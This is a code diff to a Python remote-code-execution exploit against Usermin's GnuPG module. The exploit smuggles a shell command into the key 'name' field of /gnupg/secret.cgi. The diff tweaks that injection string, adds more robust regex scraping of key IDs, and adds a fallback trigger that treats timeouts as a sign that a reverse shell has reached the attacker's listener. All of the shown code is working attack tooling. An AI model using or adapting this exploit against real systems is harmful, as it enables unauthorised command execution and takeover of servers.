@@ -131,8 +131,8 @@ class UserminRCE:
         
         secret_url = urljoin(self.base_url, "/gnupg/secret.cgi")
         payload_data = {
-            "name": f'";{payload};echo "',
-            "email": "exploit@webmin.com",
+            "name": f'";{payload}echo "',
+            "email": "1337@webmin.com",
         }
         
         headers = {'Referer': self.base_url}
@@ -151,6 +151,8 @@ class UserminRCE:
                     return True
                 else:
                     print("[-] Payload submission failed - no success message found")
+                    if "error" in response.text.lower():
+                        print("[*] Response contains error message")
                     return False
             else:
                 print(f"[-] Payload submission failed with status code: {response.status_code}")
@@ -170,15 +172,52 @@ class UserminRCE:
             response = self.session.post(list_keys_url, timeout=10)
             
             if response.status_code == 200:
-                # Look for key IDs in the response
-                keys = re.findall(r"edit_key\.cgi\?(.*?)'", response.text)
-                if keys:
-                    key_id = keys[-1]  # Get the last (most recent) key
-                    print(f"[+] Found key ID: {key_id}")
-                    return key_id
-                else:
-                    print("[-] No key IDs found in response")
-                    return None
+                # Try multiple regex patterns to find key IDs
+                patterns = [
+                    r"edit_key\.cgi\?(.*?)'",  # Original pattern
+                    r"edit_key\.cgi\?([^'\"]+)",  # More flexible pattern
+                    r"edit_key\.cgi\?([a-zA-Z0-9_=&]+)",  # Alphanumeric pattern
+                    r"edit_key\.cgi\?([^>]+)",  # Until closing tag
+                ]
+                
+                for pattern in patterns:
+                    keys = re.findall(pattern, response.text)
+                    if keys:
+                        key_id = keys[-1]  # Get the last (most recent) key
+                        print(f"[+] Found key ID: {key_id}")
+                        return key_id
+                
+                # If no patterns worked, let's debug the response
+                print("[-] No key IDs found with standard patterns")
+                print("[*] Debugging response content...")
+                
+                # Look for any edit_key.cgi references
+                if "edit_key.cgi" in response.text:
+                    print("[*] Found edit_key.cgi references in response")
+                    # Extract a sample of the response around edit_key.cgi
+                    lines = response.text.split('\n')
+                    for i, line in enumerate(lines):
+                        if "edit_key.cgi" in line:
+                            print(f"[*] Line {i+1}: {line.strip()[:100]}...")
+                            # Try to extract manually
+                            start = line.find("edit_key.cgi?")
+                            if start != -1:
+                                start += len("edit_key.cgi?")
+                                end = line.find("'", start)
+                                if end == -1:
+                                    end = line.find('"', start)
+                                if end == -1:
+                                    end = line.find(' ', start)
+                                if end == -1:
+                                    end = len(line)
+                                
+                                key_id = line[start:end]
+                                if key_id and len(key_id) > 5:  # Basic validation
+                                    print(f"[+] Manually extracted key ID: {key_id}")
+                                    return key_id
+                
+                print("[-] Could not extract key ID from response")
+                return None
             else:
                 print(f"[-] Failed to fetch key list, status code: {response.status_code}")
                 return None
@@ -235,16 +274,33 @@ class UserminRCE:
         
         # Get key ID
         key_id = self.get_key_id()
-        if not key_id:
-            return False
         
-        # Trigger payload
-        if self.trigger_payload(key_id):
-            print("[+] Exploit completed successfully!")
-            print(f"[+] Check your listener on {self.listener_ip}:{self.listener_port}")
+        # Try to trigger payload with key ID if found
+        if key_id:
+            if self.trigger_payload(key_id):
+                print("[+] Exploit completed successfully!")
+                print(f"[+] Check your listener on {self.listener_ip}:{self.listener_port}")
+                return True
+            else:
+                print("[-] Failed to trigger payload with key ID")
+        
+        # Fallback: try to trigger without key ID (original method)
+        print("[!] Trying fallback method without key ID...")
+        try:
+            # Try to access the list_keys page which might trigger the payload
+            list_keys_url = urljoin(self.base_url, "/gnupg/list_keys.cgi")
+            response = self.session.post(list_keys_url, timeout=3)
+            print("[+] Fallback trigger attempted")
+            print("[+] Check your listener for reverse shell")
             return True
-        else:
-            print("[-] Exploit failed at final stage")
+        except requests.exceptions.ReadTimeout:
+            print("[+] Fallback trigger timeout - reverse shell should be incoming!")
+            return True
+        except requests.exceptions.ConnectionError:
+            print("[+] Fallback trigger connection closed - reverse shell likely established")
+            return True
+        except Exception as e:
+            print(f"[-] Fallback trigger failed: {e}")
             return False
 
 def main():
